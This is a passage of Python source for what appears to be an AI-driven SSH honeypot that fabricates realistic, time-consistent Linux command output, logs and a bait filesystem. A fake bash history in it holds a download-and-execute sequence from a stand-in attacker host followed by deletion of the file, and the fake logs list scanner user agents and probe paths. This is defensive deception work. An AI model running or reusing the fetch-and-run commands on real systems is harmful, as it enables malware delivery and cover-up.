"""
hard_rules_dynamic.py
=====================
Fully dynamic, stateful hard rules for AI honeypot.

Key improvements over static hard rules:
- Uptime increments every second (real clock)
- Load average fluctuates naturally (Gaussian noise)
- Process CPU/MEM varies slightly on each call
- Netstat shows ESTABLISHED + TIME_WAIT + LISTEN
- Logs grow over time with advancing timestamps
- ls -la timestamps consistent with boot time
- /proc/PID/status consistent with process table
- ps aux PIDs stable but CPU/MEM alive
- All timestamps internally consistent per session
"""

import re
import time
import random
import math
from collections import defaultdict


# ============================================================
# NORMALIZE
# ============================================================

def normalize_command(cmd):
    return " ".join((cmd or "").strip().split())


# ============================================================
# SESSION STATE
# Sessions are keyed by session_id (hostname|user).
# Each session gets its own consistent state created once.
# ============================================================

_SESSION_STATE = {}


def _get_state(session_id, profile):
    """
    Get or create persistent state for a session.
    State is created ONCE per session and never reset.
    This ensures all commands within a session are consistent.
    """
    if session_id not in _SESSION_STATE:
        _SESSION_STATE[session_id] = _build_state(session_id, profile)
    return _SESSION_STATE[session_id]


def _build_state(session_id, profile):
    """
    Build initial session state.
    Called exactly once per session.
    """
    services  = profile.get("services", [])
    ip        = profile.get("ip", "192.168.1.100")
    webroot   = profile.get("webroot", "/var/www/html")

    # System booted 3 days 4h 22m ago — fixed offset from session creation
    boot_offset = 3 * 86400 + 4 * 3600 + 22 * 60 + random.randint(0, 3600)
    boot_time   = time.time() - boot_offset

    # Build stable process table with fixed PIDs
    processes = _build_processes(services)

    # Build stable file system with consistent timestamps
    files = _build_files(profile, boot_time)

    # Build stable network table
    network = _build_network(profile)

    # Seed for per-session variation (same session = same random seed base)
    seed = abs(hash(session_id)) % 100000

    return {
        "boot_time":   boot_time,
        "processes":   processes,
        "files":       files,
        "network":     network,
        "profile":     profile,
        "seed":        seed,
        "log_start":   boot_time + 3600,  # logs start 1h after boot
        "connection_counter": 0,
    }


# ============================================================
# PROCESS TABLE
# Fixed PIDs, but CPU/MEM alive on each render
# ============================================================

def _build_processes(services):
    """Build fixed process table. PIDs never change per session."""
    procs = [
        {"pid": 1,    "ppid": 0,    "user": "root",     "base_cpu": 0.0, "base_mem": 0.4, "vsz": 168212,  "base_rss": 9232,  "tty": "?",     "stat": "Ss", "started_offset": 0,    "cmd": "/sbin/init"},
        {"pid": 2,    "ppid": 0,    "user": "root",     "base_cpu": 0.0, "base_mem": 0.0, "vsz": 0,       "base_rss": 0,     "tty": "?",     "stat": "S",  "started_offset": 1,    "cmd": "[kthreadd]"},
        {"pid": 382,  "ppid": 1,    "user": "root",     "base_cpu": 0.0, "base_mem": 0.3, "vsz": 48680,   "base_rss": 6820,  "tty": "?",     "stat": "Ss", "started_offset": 2,    "cmd": "/lib/systemd/systemd-journald"},
        {"pid": 415,  "ppid": 1,    "user": "root",     "base_cpu": 0.0, "base_mem": 0.2, "vsz": 23444,   "base_rss": 5040,  "tty": "?",     "stat": "Ss", "started_offset": 3,    "cmd": "/lib/systemd/systemd-udevd"},
        {"pid": 742,  "ppid": 1,    "user": "root",     "base_cpu": 0.0, "base_mem": 0.3, "vsz": 15436,   "base_rss": 7120,  "tty": "?",     "stat": "Ss", "started_offset": 60,   "cmd": "/usr/sbin/sshd -D"},
    ]

    if "nginx" in services:
        procs += [
            {"pid": 841, "ppid": 1,   "user": "root",     "base_cpu": 0.0, "base_mem": 0.2, "vsz": 55240,   "base_rss": 4300,  "tty": "?", "stat": "Ss", "started_offset": 90,  "cmd": "nginx: master process /usr/sbin/nginx"},
            {"pid": 842, "ppid": 841, "user": "www-data", "base_cpu": 0.1, "base_mem": 0.3, "vsz": 55832,   "base_rss": 6120,  "tty": "?", "stat": "S",  "started_offset": 91,  "cmd": "nginx: worker process"},
            {"pid": 843, "ppid": 841, "user": "www-data", "base_cpu": 0.1, "base_mem": 0.3, "vsz": 55832,   "base_rss": 6048,  "tty": "?", "stat": "S",  "started_offset": 91,  "cmd": "nginx: worker process"},
        ]

    if "apache2" in services:
        procs += [
            {"pid": 841, "ppid": 1,   "user": "root",     "base_cpu": 0.0, "base_mem": 0.3, "vsz": 286432,  "base_rss": 7392,  "tty": "?", "stat": "Ss", "started_offset": 90,  "cmd": "/usr/sbin/apache2 -k start"},
            {"pid": 844, "ppid": 841, "user": "www-data", "base_cpu": 0.1, "base_mem": 0.4, "vsz": 287120,  "base_rss": 8244,  "tty": "?", "stat": "S",  "started_offset": 91,  "cmd": "/usr/sbin/apache2 -k start"},
            {"pid": 845, "ppid": 841, "user": "www-data", "base_cpu": 0.0, "base_mem": 0.4, "vsz": 287120,  "base_rss": 8180,  "tty": "?", "stat": "S",  "started_offset": 91,  "cmd": "/usr/sbin/apache2 -k start"},
        ]

    if "mysql" in services:
        procs.append({"pid": 1021, "ppid": 1, "user": "mysql",    "base_cpu": 0.3, "base_mem": 2.4, "vsz": 1274280, "base_rss": 98220, "tty": "?", "stat": "Sl",  "started_offset": 120, "cmd": "/usr/sbin/mysqld"})

    if "redis" in services:
        procs.append({"pid": 1110, "ppid": 1, "user": "redis",    "base_cpu": 0.1, "base_mem": 0.5, "vsz": 64028,   "base_rss": 10540, "tty": "?", "stat": "Ssl", "started_offset": 150, "cmd": "/usr/bin/redis-server 127.0.0.1:6379"})

    if "node" in services:
        procs.append({"pid": 1290, "ppid": 1, "user": "ubuntu",   "base_cpu": 0.4, "base_mem": 1.1, "vsz": 712940,  "base_rss": 44320, "tty": "?", "stat": "Sl",  "started_offset": 180, "cmd": "node server.js"})

    if "flask" in services:
        procs.append({"pid": 1334, "ppid": 1, "user": "ubuntu",   "base_cpu": 0.2, "base_mem": 1.0, "vsz": 246224,  "base_rss": 38800, "tty": "?", "stat": "Sl",  "started_offset": 185, "cmd": "python3 app.py"})

    if "postgres" in services:
        procs.append({"pid": 1044, "ppid": 1, "user": "postgres", "base_cpu": 0.1, "base_mem": 1.5, "vsz": 219472,  "base_rss": 30212, "tty": "?", "stat": "Ss",  "started_offset": 130, "cmd": "/usr/lib/postgresql/12/bin/postgres"})

    if "ftp" in services:
        procs.append({"pid": 931,  "ppid": 1, "user": "root",     "base_cpu": 0.0, "base_mem": 0.1, "vsz": 14752,   "base_rss": 2820,  "tty": "?", "stat": "Ss",  "started_offset": 100, "cmd": "/usr/sbin/vsftpd /etc/vsftpd.conf"})

    # Shell session — stable PID
    procs.append({"pid": 1501, "ppid": 1499, "user": "root", "base_cpu": 0.0, "base_mem": 0.1, "vsz": 8892, "base_rss": 3340, "tty": "pts/0", "stat": "Ss", "started_offset": 0, "cmd": "-bash"})

    return procs


def _render_process(proc, boot_time, call_time):
    """
    Render one process line with natural variation.
    CPU/MEM fluctuate slightly on every call — looks alive.
    """
    # Natural CPU variation — sin wave + noise for realism
    t = call_time - boot_time
    phase = (proc["pid"] * 1.7) % (2 * math.pi)
    cpu_variation = proc["base_cpu"] * 0.3 * math.sin(t / 30 + phase)
    cpu_noise     = random.gauss(0, 0.05)
    cpu = max(0.0, min(99.9, proc["base_cpu"] + cpu_variation + cpu_noise))

    # Memory variation — small random fluctuation
    mem_noise = random.gauss(0, 0.05)
    mem = max(0.0, min(99.9, proc["base_mem"] + mem_noise))
    rss = max(0, int(proc["base_rss"] * (1 + random.uniform(-0.03, 0.03))))

    # START time — when process started after boot
    start_time = boot_time + proc["started_offset"]
    start_str  = time.strftime("%H:%M", time.localtime(start_time))

    # Accumulated CPU time — increases with uptime
    elapsed_mins = (call_time - start_time) / 60
    cpu_secs = int(elapsed_mins * proc["base_cpu"] * 0.6)
    cpu_time = f"{cpu_secs // 60}:{cpu_secs % 60:02d}"

    return (
        f"{proc['user']:<12} {proc['pid']:>5} {cpu:>4.1f} {mem:>3.1f} "
        f"{proc['vsz']:>7} {rss:>5} {proc['tty']:<8} {proc['stat']:<4} "
        f"{start_str:<5} {cpu_time:>5} {proc['cmd']}"
    )


def _get_live_ps_aux(state):
    """
    Full ps aux output with:
    - Stable PIDs
    - Fluctuating CPU/MEM
    - Occasional short-lived cron/cleanup process
    - ps command itself as last line
    """
    boot_time = state["boot_time"]
    now       = time.time()

    lines = ["USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND"]

    for proc in state["processes"]:
        lines.append(_render_process(proc, boot_time, now))

    # 15% chance of a short-lived cron process appearing
    if random.random() < 0.15:
        cron_pid = random.randint(8000, 12000)
        lines.append(
            f"{'root':<12} {cron_pid:>5} {'0.0':>4} {'0.0':>3} "
            f"{'28408':>7} {'3240':>5} {'?':<8} {'Ss':<4} "
            f"{time.strftime('%H:%M'):>5} {'0:00':>5} /usr/sbin/CRON -f"
        )

    # ps aux command itself
    ps_pid = max(p["pid"] for p in state["processes"]) + random.randint(1, 50)
    lines.append(
        f"{'root':<12} {ps_pid:>5} {'0.0':>4} {'0.1':>3} "
        f"{'10612':>7} {'3268':>5} {'pts/0':<8} {'R+':<4} "
        f"{time.strftime('%H:%M'):>5} {'0:00':>5} ps aux"
    )

    return "\n".join(lines)


def _get_live_ps_ef(state):
    """ps -ef with stable PIDs and live timing."""
    boot_time = state["boot_time"]
    now       = time.time()

    lines = ["UID          PID    PPID  C STIME TTY          TIME CMD"]

    for proc in state["processes"]:
        start_time = boot_time + proc["started_offset"]
        stime      = time.strftime("%H:%M", time.localtime(start_time))
        elapsed    = now - start_time
        cpu_secs   = int(elapsed / 60 * proc["base_cpu"] * 0.6)
        cpu_time   = f"{cpu_secs // 60:02d}:{cpu_secs % 60:02d}:{0:02d}"

        # C column — instantaneous CPU usage 0-99
        c_val = min(99, int(proc["base_cpu"] * 10 + random.random()))

        lines.append(
            f"{proc['user']:<12} {proc['pid']:>5} {proc['ppid']:>7} "
            f"{c_val:>2} {stime} {proc['tty']:<12} {cpu_time} {proc['cmd']}"
        )

    ps_pid = max(p["pid"] for p in state["processes"]) + random.randint(1, 50)
    lines.append(
        f"{'root':<12} {ps_pid:>5} {'1501':>7} "
        f" 0 {time.strftime('%H:%M')} {'pts/0':<12} 00:00:00 ps -ef"
    )

    return "\n".join(lines)


def _get_live_ps_grep(state, pattern):
    """ps aux | grep PATTERN — reads from live process table."""
    boot_time = state["boot_time"]
    now       = time.time()
    matched   = []

    for proc in state["processes"]:
        if pattern.lower() in proc["cmd"].lower() or pattern.lower() in proc["user"].lower():
            matched.append(_render_process(proc, boot_time, now))

    # grep process itself
    grep_pid = max(p["pid"] for p in state["processes"]) + random.randint(1, 50)
    matched.append(
        f"{'root':<12} {grep_pid:>5} {'0.0':>4} {'0.0':>3} "
        f"{'6432':>7} {'720':>5} {'pts/0':<8} {'S+':<4} "
        f"{time.strftime('%H:%M'):>5} {'0:00':>5} grep --color=auto {pattern}"
    )

    return "\n".join(matched)


# ============================================================
# UPTIME — increments every second
# ============================================================

def _get_live_uptime(state):
    elapsed = time.time() - state["boot_time"]
    days    = int(elapsed // 86400)
    hours   = int((elapsed % 86400) // 3600)
    mins    = int((elapsed % 3600) // 60)

    # Load average — sinusoidal + noise, looks organic
    t      = elapsed / 3600  # hours since boot
    load1  = max(0.01, 0.08 + 0.05 * math.sin(t * 2.3) + random.gauss(0, 0.02))
    load5  = max(0.01, 0.06 + 0.03 * math.sin(t * 1.1) + random.gauss(0, 0.01))
    load15 = max(0.01, 0.05 + 0.02 * math.sin(t * 0.5) + random.gauss(0, 0.01))

    time_str = time.strftime("%H:%M:%S")
    up_str   = f"{days} days, {hours}:{mins:02d}"

    return (
        f" {time_str} up {up_str},  1 user,  "
        f"load average: {load1:.2f}, {load5:.2f}, {load15:.2f}"
    )


# ============================================================
# NETWORK — LISTEN + ESTABLISHED + TIME_WAIT
# ============================================================

def _build_network(profile):
    ports    = profile.get("ports", [])
    services = profile.get("services", [])
    ip       = profile.get("ip", "192.168.1.100")

    service_map = {
        22:   ("sshd",         742),
        80:   ("nginx" if "nginx" in services else "apache2", 841),
        21:   ("vsftpd",       931),
        3000: ("node",         1290),
        5000: ("python3",      1334),
        3306: ("mysqld",       1021),
        5432: ("postgres",     1044),
        6379: ("redis-server", 1110),
        443:  ("nginx" if "nginx" in services else "apache2", 841),
    }

    connections = []
    for port in ports:
        name, pid = service_map.get(port, ("service", 1000))
        connections.append({
            "proto":   "tcp",
            "local":   f"0.0.0.0:{port}",
            "foreign": "0.0.0.0:*",
            "state":   "LISTEN",
            "pid":     pid,
            "program": name,
        })

    return connections


def _get_live_netstat(state):
    """
    Netstat with:
    - LISTEN for all profile ports
    - ESTABLISHED for SSH attacker connection
    - ESTABLISHED for web connections if nginx/apache
    - TIME_WAIT for recently closed connections
    """
    profile     = state["profile"]
    ip          = profile.get("ip", "192.168.1.100")
    services    = profile.get("services", [])
    connections = state["network"]

    lines = [
        "Active Internet connections (servers and established)",
        "Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name",
    ]

    # LISTEN entries
    for conn in connections:
        recv = random.choice([0, 0, 0, 0, 1])
        send = random.choice([0, 0, 0, 0, 2])
        lines.append(
            f"{conn['proto']:<6}  {recv:>5}  {send:>5} "
            f"{conn['local']:<23} {conn['foreign']:<23} "
            f"{conn['state']:<12} {conn['pid']}/{conn['program']}"
        )

    # ESTABLISHED: SSH connection from attacker
    attacker_port = 40000 + (abs(hash(str(state["boot_time"]))) % 20000)
    lines.append(
        f"{'tcp':<6}  {'0':>5}  {'0':>5} "
        f"{ip}:22            "
        f"198.51.100.3:{attacker_port}    "
        f"{'ESTABLISHED':<12} 742/sshd"
    )

    # ESTABLISHED: web connections if web server running
    if "nginx" in services or "apache2" in services:
        web_port = 80
        web_prog = "841/nginx" if "nginx" in services else "841/apache2"
        n_web    = random.randint(2, 8)

        for i in range(n_web):
            client_ip   = f"192.168.1.{random.randint(10, 254)}"
            client_port = random.randint(40000, 60000)
            recv_q      = random.choice([0, 0, 0, 512, 1024])
            lines.append(
                f"{'tcp':<6}  {recv_q:>5}  {'0':>5} "
                f"{ip}:{web_port:<16}        "
                f"{client_ip}:{client_port:<16} "
                f"{'ESTABLISHED':<12} {web_prog}"
            )

        # TIME_WAIT connections — recently closed
        n_tw = random.randint(1, 4)
        for i in range(n_tw):
            client_ip   = f"192.168.1.{random.randint(10, 254)}"
            client_port = random.randint(40000, 60000)
            lines.append(
                f"{'tcp':<6}  {'0':>5}  {'0':>5} "
                f"{ip}:{web_port:<16}        "
                f"{client_ip}:{client_port:<16} "
                f"{'TIME_WAIT':<12} -"
            )

    # MySQL established if mysql running
    if "mysql" in services:
        lines.append(
            f"{'tcp':<6}  {'0':>5}  {'0':>5} "
            f"127.0.0.1:3306          "
            f"127.0.0.1:{random.randint(40000, 60000)}         "
            f"{'ESTABLISHED':<12} 1021/mysqld"
        )

    return "\n".join(lines)


def _get_live_ss(state):
    """ss with LISTEN + ESTABLISHED + TIME_WAIT."""
    profile  = state["profile"]
    ip       = profile.get("ip", "192.168.1.100")
    services = profile.get("services", [])

    lines = ["Netid State       Recv-Q Send-Q Local Address:Port    Peer Address:Port  Process"]

    # LISTEN
    for conn in state["network"]:
        port = conn["local"].split(":")[-1]
        recv = random.choice([0, 0, 0, 1])
        send = random.choice([0, 0, 128, 128])
        lines.append(
            f"tcp   LISTEN      {recv:>5}  {send:>5} "
            f"0.0.0.0:{port:<5}              0.0.0.0:*        "
            f'users:(("{conn["program"]}",pid={conn["pid"]},fd=3))'
        )

    # ESTABLISHED SSH
    atk_port = 40000 + (abs(hash(str(state["boot_time"]))) % 20000)
    lines.append(
        f"tcp   ESTAB       {'0':>5}  {'0':>5} "
        f"{ip}:22               "
        f"198.51.100.3:{atk_port}  "
        f'users:(("sshd",pid=742,fd=5))'
    )

    # ESTABLISHED web
    if "nginx" in services or "apache2" in services:
        prog = "nginx" if "nginx" in services else "apache2"
        for _ in range(random.randint(2, 6)):
            c_ip   = f"192.168.1.{random.randint(10,254)}"
            c_port = random.randint(40000, 60000)
            lines.append(
                f"tcp   ESTAB       {'0':>5}  {'0':>5} "
                f"{ip}:80                 "
                f"{c_ip}:{c_port}     "
                f'users:(("{prog}",pid=841,fd=12))'
            )
        for _ in range(random.randint(0, 3)):
            c_ip   = f"192.168.1.{random.randint(10,254)}"
            c_port = random.randint(40000, 60000)
            lines.append(
                f"tcp   TIME-WAIT   {'0':>5}  {'0':>5} "
                f"{ip}:80                 "
                f"{c_ip}:{c_port}     "
            )

    return "\n".join(lines)


# ============================================================
# LOG FILES — grow over time
# ============================================================

_NGINX_PATHS  = ["/", "/index.php", "/login", "/admin", "/.env",
                 "/wp-login.php", "/wp-config.php", "/api/v1/users",
                 "/api/v1/auth", "/.git/config", "/backup.zip",
                 "/config.php", "/phpmyadmin/", "/server-status"]
_HTTP_METHODS = ["GET", "GET", "GET", "POST", "HEAD", "OPTIONS"]
_HTTP_STATUS  = [200, 200, 200, 200, 301, 302, 403, 404, 500]
_USER_AGENTS  = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "curl/7.81.0",
    "python-requests/2.31.0",
    "Wget/1.21.2",
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
    "masscan/1.0",
    "sqlmap/1.7.8",
    "Nikto/2.1.6",
    "Go-http-client/1.1",
]
_ATTACKER_IPS = [
    "198.51.100.3", "203.0.113.10", "192.168.1.44",
    "45.33.32.156", "167.99.204.132", "159.65.12.88",
]


def _get_live_nginx_log(state, n_lines=20):
    """
    Nginx access log that grows over time.
    New lines appear as time advances.
    Always ends at current time.
    """
    boot_time  = state["boot_time"]
    log_start  = state["log_start"]
    now        = time.time()

    random.seed(state["seed"])  # reproducible per session
    lines      = []
    ts         = log_start

    while ts < now:
        interval = random.expovariate(1 / 45)  # avg 1 request per 45 seconds
        ts += interval
        if ts >= now:
            break

        ip     = random.choice(_ATTACKER_IPS)
        method = random.choice(_HTTP_METHODS)
        path   = random.choice(_NGINX_PATHS)
        status = random.choice(_HTTP_STATUS)
        size   = random.randint(200, 8000)
        agent  = random.choice(_USER_AGENTS)
        ts_str = time.strftime("%d/%b/%Y:%H:%M:%S +0000", time.localtime(ts))

        lines.append(
            f'{ip} - - [{ts_str}] "{method} {path} HTTP/1.1" '
            f'{status} {size} "-" "{agent}"'
        )

    random.seed()  # reset seed
    return "\n".join(lines[-n_lines:])


def _get_live_auth_log(state, n_lines=20):
    """Auth log with realistic SSH attempts growing over time."""
    hostname  = state["profile"].get("hostname", "web-prod-01")
    log_start = state["log_start"]
    now       = time.time()

    random.seed(state["seed"] + 1)
    lines     = []
    ts        = log_start

    USERS     = ["root", "admin", "ubuntu", "deploy", "user", "test", "pi"]
    PORTS_SRC = lambda: random.randint(40000, 65000)

    while ts < now:
        ts += random.expovariate(1 / 120)  # avg 1 event per 2 minutes
        if ts >= now:
            break

        ts_str = time.strftime("%b %d %H:%M:%S", time.localtime(ts))
        ip     = random.choice(_ATTACKER_IPS)
        user   = random.choice(USERS)
        port   = PORTS_SRC()
        pid    = random.randint(1400, 3000)

        if random.random() < 0.85:
            lines.append(
                f"{ts_str} {hostname} sshd[{pid}]: "
                f"Failed password for {user} from {ip} port {port} ssh2"
            )
        else:
            lines.append(
                f"{ts_str} {hostname} sshd[{pid}]: "
                f"Accepted password for {user} from {ip} port {port} ssh2"
            )
            lines.append(
                f"{ts_str} {hostname} sshd[{pid}]: "
                f"pam_unix(sshd:session): session opened for user {user} by (uid=0)"
            )

    random.seed()
    return "\n".join(lines[-n_lines:])


def _get_live_syslog(state, n_lines=15):
    """Syslog with realistic system events."""
    hostname  = state["profile"].get("hostname", "web-prod-01")
    ip        = state["profile"].get("ip", "192.168.1.100")
    log_start = state["log_start"]
    now       = time.time()

    random.seed(state["seed"] + 2)
    lines     = []
    ts        = log_start

    while ts < now:
        ts += random.expovariate(1 / 60)
        if ts >= now:
            break

        ts_str = time.strftime("%b %d %H:%M:%S", time.localtime(ts))
        choice = random.random()

        if choice < 0.3:
            lines.append(f"{ts_str} {hostname} CRON[{random.randint(1400,3000)}]: "
                         f"(root) CMD (/usr/local/bin/backup.sh)")
        elif choice < 0.5:
            lines.append(f"{ts_str} {hostname} systemd[1]: "
                         f"Started Session {random.randint(1,20)} of user root.")
        elif choice < 0.7:
            src = random.choice(_ATTACKER_IPS)
            lines.append(f"{ts_str} {hostname} kernel: [UFW BLOCK] IN=eth0 OUT= "
                         f"SRC={src} DST={ip} LEN=44 PROTO=TCP")
        else:
            lines.append(f"{ts_str} {hostname} sshd[{random.randint(700,800)}]: "
                         f"Received disconnect from 192.168.1.44 port {random.randint(40000,60000)}")

    random.seed()
    return "\n".join(lines[-n_lines:])


# ============================================================
# FILE SYSTEM — consistent timestamps with boot time
# ============================================================

def _build_files(profile, boot_time):
    """Build VFS with timestamps consistent with boot time."""
    env     = profile.get("env", {})
    webroot = profile.get("webroot", "/var/www/html")
    services = profile.get("services", [])

    # Files were last modified shortly after boot
    file_mtime  = boot_time + random.randint(3600, 7200)
    mtime_str   = time.strftime("%b %d %H:%M", time.localtime(file_mtime))
    mtime_str2  = time.strftime("%b %d  %Y", time.localtime(boot_time - 86400 * 10))

    env_content = "\n".join(f"{k}={v}" for k, v in env.items())

    db_user = env.get("DB_USERNAME", "app_user")
    db_pass = env.get("DB_PASSWORD", "secure_db_pwd")
    db_name = env.get("DB_DATABASE", "app_prod")
    db_host = env.get("DB_HOST", "127.0.0.1")

    config_php = (
        f"<?php\n"
        f"$DB_HOST = \"{db_host}\";\n"
        f"$DB_NAME = \"{db_name}\";\n"
        f"$DB_USER = \"{db_user}\";\n"
        f"$DB_PASS = \"{db_pass}\";\n\n"
        f"$conn = mysqli_connect($DB_HOST, $DB_USER, $DB_PASS, $DB_NAME);\n"
        f"if (!$conn) {{ die(\"Connection failed\"); }}\n?>"
    )

    bash_history = (
        f"ls -la\ncd {webroot}\ncat .env\n"
        f"mysql -u {db_user} -p\n"
        f"sudo -l\nwget http://198.51.100.3/d2 -O /tmp/d2\n"
        f"chmod +x /tmp/d2\n/tmp/d2\ncat /etc/passwd\nps aux\n"
        f"netstat -tulpn\nrm -f /tmp/d2"
    )

    return {
        f"{webroot}/.env":          (env_content,   mtime_str),
        f"{webroot}/config.php":    (config_php,    mtime_str),
        f"{webroot}/index.php":     ("<?php\nrequire_once 'config.php';\nsession_start();\nheader('Location: /login.php');\n?>", mtime_str),
        "/root/.bash_history":      (bash_history,  mtime_str),
        "/opt/app/.env":            (env_content,   mtime_str),
        "/home/deploy/.env":        (env_content,   mtime_str),
        "/root/.ssh/authorized_keys": ("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... deploy@backup-server", mtime_str2),
    }


def _get_file(state, path):
    """Get file content from VFS. Returns (content, mtime) or None."""
    return state["files"].get(path)


def _build_passwd(profile):
    """Build the canonical /etc/passwd content for this profile."""
    services = profile.get("services", [])
    lines = [
        "root:x:0:0:root:/root:/bin/bash",
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
        "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
        "sys:x:3:3:sys:/dev:/usr/sbin/nologin",
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin",
        "sshd:x:100:65534::/run/sshd:/usr/sbin/nologin",
    ]
    if "mysql" in services:
        lines.append("mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false")
    if "postgres" in services:
        lines.append("postgres:x:113:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash")
    if "redis" in services:
        lines.append("redis:x:114:119::/var/lib/redis:/usr/sbin/nologin")
    lines += ["deploy:x:1000:1000:Deploy User:/home/deploy:/bin/bash",
              "app:x:1001:1001:Application User:/home/app:/bin/bash"]
    return "\n".join(lines)


def _resolve_file_content(path, profile, state):
    """
    Return the real text content of a known file, for deterministic
    commands like base64/md5sum. Returns None if the file is unknown.
    """
    # System files we generate
    if path in ("/etc/passwd",):
        return _build_passwd(profile)
    # Files tracked in the VMS/VFS
    f = state["files"].get(path)
    if f is not None:
        # stored as (content, mtime) or plain string
        return f[0] if isinstance(f, (tuple, list)) else f
    # .env in the webroot
    webroot = profile.get("webroot", "/var/www/html")
    if path in (f"{webroot}/.env", ".env"):
        return state["files"].get(f"{webroot}/.env", ("",))[0] \
            if isinstance(state["files"].get(f"{webroot}/.env"), (tuple, list)) \
            else state["files"].get(f"{webroot}/.env")
    return None


# ============================================================
# LS -LA — consistent timestamps with boot time
# ============================================================

def _get_live_ls_la(state, cwd):
    """ls -la with timestamps consistent with system boot time."""
    boot_time   = state["boot_time"]
    profile     = state["profile"]
    webroot     = profile.get("webroot", "/var/www/html")
    vuln        = profile.get("vulnerability", "")

    # File times: boot + offset
    recent = time.strftime("%b %d %H:%M", time.localtime(boot_time + random.randint(3600, 7200)))
    older  = time.strftime("%b %d  %Y",   time.localtime(boot_time - 86400 * random.randint(5, 30)))
    very_old = time.strftime("%b %d  %Y", time.localtime(boot_time - 86400 * random.randint(60, 180)))

    if cwd == webroot:
        if vuln in ["exposed_laravel_env", "exposed_dev_env"]:
            return (
                f"total 44\n"
                f"drwxr-xr-x 6 www-data www-data 4096 {recent} .\n"
                f"drwxr-xr-x 3 root     root     4096 {older} ..\n"
                f"-rw-r--r-- 1 www-data www-data  318 {recent} .env\n"
                f"-rw-r--r-- 1 www-data www-data  612 {recent} index.php\n"
                f"-rw-r--r-- 1 www-data www-data 1284 {recent} login.php\n"
                f"-rw-r--r-- 1 www-data www-data  421 {recent} config.php\n"
                f"drwxr-xr-x 2 www-data www-data 4096 {older} assets\n"
                f"drwxrwxr-x 2 www-data www-data 4096 {recent} uploads\n"
                f"drwxr-xr-x 5 www-data www-data 4096 {older} vendor"
            )
        if vuln == "old_php_config":
            return (
                f"total 36\n"
                f"drwxr-xr-x 5 www-data www-data 4096 {very_old} .\n"
                f"drwxr-xr-x 3 root     root     4096 {very_old} ..\n"
                f"-rw-r--r-- 1 www-data www-data 1042 {very_old} index.php\n"
                f"-rw-r--r-- 1 www-data www-data 1811 {very_old} admin.php\n"
                f"-rw-r--r-- 1 www-data www-data  612 {very_old} config.php\n"
                f"-rw-r--r-- 1 www-data www-data 4096 {very_old} backup.zip\n"
                f"drwxr-xr-x 2 www-data www-data 4096 {very_old} uploads"
            )

    if cwd == "/tmp":
        now_str = time.strftime("%b %d %H:%M")
        return (
            f"total 28\n"
            f"drwxrwxrwt  7 root root 4096 {now_str} .\n"
            f"drwxr-xr-x 20 root root 4096 {recent} ..\n"
            f"-rwxr-xr-x  1 root root 1234 {now_str} d2\n"
            f"drwx------  3 root root 4096 {recent} systemd-private-abc"
        )

    if cwd == "/root":
        return (
            f"total 36\n"
            f"drwx------  5 root root 4096 {recent} .\n"
            f"drwxr-xr-x 20 root root 4096 {older} ..\n"
            f"-rw-------  1 root root  512 {recent} .bash_history\n"
            f"-rw-r--r--  1 root root 3106 {older} .bashrc\n"
            f"drwx------  2 root root 4096 {older} .ssh\n"
            f"drwxr-xr-x  2 root root 4096 {older} backup\n"
            f"drwxr-xr-x  2 root root 4096 {older} scripts\n"
            f"-rw-------  1 root root 1675 {older} server.key"
        )

    # Default
    return (
        f"total 88\n"
        f"drwxr-xr-x  20 root root 4096 {recent} .\n"
        f"drwxr-xr-x  20 root root 4096 {recent} ..\n"
        f"lrwxrwxrwx   1 root root    7 {older} bin -> usr/bin\n"
        f"drwxr-xr-x   4 root root 4096 {older} boot\n"
        f"drwxr-xr-x  18 root root 3920 {recent} dev\n"
        f"drwxr-xr-x  92 root root 4096 {recent} etc\n"
        f"drwxr-xr-x   3 root root 4096 {older} home\n"
        f"drwx------   5 root root 4096 {recent} root\n"
        f"drwxrwxrwt  10 root root 4096 {recent} tmp\n"
        f"drwxr-xr-x  14 root root 4096 {older} usr\n"
        f"drwxr-xr-x  13 root root 4096 {older} var"
    )


# ============================================================
# MEMORY / DISK — slight variation
# ============================================================

def _get_live_free(unit="h"):
    """free -h with natural memory variation."""
    total_mb  = 3891
    # Used memory fluctuates ±5%
    used_mb   = int(1248 * random.uniform(0.92, 1.08))
    free_mb   = total_mb - used_mb
    cached_mb = int(1730 * random.uniform(0.95, 1.05))
    avail_mb  = total_mb - used_mb + int(cached_mb * 0.7)

    if unit == "h":
        def fmt(mb):
            if mb >= 1024:
                return f"{mb/1024:.1f}Gi"
            return f"{mb}Mi"
        return (
            f"               total        used        free      shared  buff/cache   available\n"
            f"Mem:        {fmt(total_mb):>8}    {fmt(used_mb):>8}    {fmt(free_mb):>8}      "
            f"{'54Mi':>8}    {fmt(cached_mb):>8}    {fmt(avail_mb):>8}\n"
            f"Swap:          1.0Gi          0B       1.0Gi"
        )
    return (
        f"               total        used        free      shared  buff/cache   available\n"
        f"Mem:         {total_mb:>6}      {used_mb:>6}      {free_mb:>6}          54      {cached_mb:>6}      {avail_mb:>6}\n"
        f"Swap:          1024           0        1024"
    )


def _get_live_df():
    """df -h with slight disk variation."""
    used_gb  = int(12 * random.uniform(0.98, 1.02))
    total_gb = 49
    free_gb  = total_gb - used_gb
    pct      = int(used_gb / total_gb * 100)

    return (
        f"Filesystem      Size  Used Avail Use% Mounted on\n"
        f"tmpfs           390M  1.3M  389M   1% /run\n"
        f"/dev/sda1        {total_gb}G  {used_gb:>3}G  {free_gb:>3}G  {pct}% /\n"
        f"tmpfs           2.0G     0  2.0G   0% /dev/shm\n"
        f"tmpfs           5.0M     0  5.0M   0% /run/lock\n"
        f"/dev/sda15      105M  6.1M   99M   6% /boot/efi\n"
        f"tmpfs           390M  4.0K  390M   1% /run/user/1000"
    )


# ============================================================
# PROC STATUS — consistent with process table
# ============================================================

def _get_proc_status(state, pid):
    """
    /proc/PID/status consistent with the session's process table.
    """
    procs = state["processes"]
    proc  = next((p for p in procs if p["pid"] == pid), None)

    if not proc:
        return f"cat: /proc/{pid}/status: No such file or directory"

    user_uid = {
